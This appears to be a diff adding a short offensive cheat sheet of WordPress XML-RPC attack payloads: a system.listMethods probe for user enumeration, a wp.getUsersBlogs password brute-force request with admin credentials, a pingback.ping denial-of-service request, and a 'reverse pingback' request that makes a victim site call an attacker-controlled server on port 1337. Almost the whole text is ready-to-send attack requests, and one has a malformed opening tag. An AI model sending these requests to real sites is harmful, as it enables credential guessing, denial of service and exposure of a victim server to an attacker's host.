@@ -1,0 +1,80 @@
+username enumerate == cmseek/wpscan
+
+site:- https://example.com/xmlrpc.php
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+	<methodName>system.listMethods</methodName>
+	<params></params>
+</methodCall>
+
+********************************************************************
+********************************************************************
+
+xml-rpc password bruteforce
+
+xml-rpc password bruteforce
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+	<methodName>wp.getUsersBlogs</methodName>
+	<params>
+		<param>
+	  		<value> 
+				<string>admin</string>
+			</value>
+		</param>
+
+		<param>
+	  		<value>
+				 <string>Admin@123</string>
+			</value>
+		</param>
+</params>
+</methodCall>
+
+********************************************************************
+********************************************************************
+
+xml-rpc DOS Attack
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+	<methodName>pingback.ping</methodName>
+	<params>
+		<param>
+	  		<value> 
+				<string> http://example.com </string>
+			</value>
+		</param>
+
+		<param>
+	  		<value>
+				 <string> http://example.com </string>
+			</value>
+		</param>
+</params>
+</methodCall>
+
+********************************************************************
+********************************************************************
+
+xml-rpc reverse ping back attack
+
+<?xml version="1.0" encoding="UTF-8"?>
+methodCall>
+	<methodName>pingback.ping</methodName>
+	<params>
+		<param>
+			<value>
+				<string>http://your server ip:port(1337)</string>
+			</value>
+		</param>
+		<param>
+			<value>
+				<string>http://victime wp site legal post full url</string>
+
+			</value>
+		</param>
+</params>
+</methodCall>
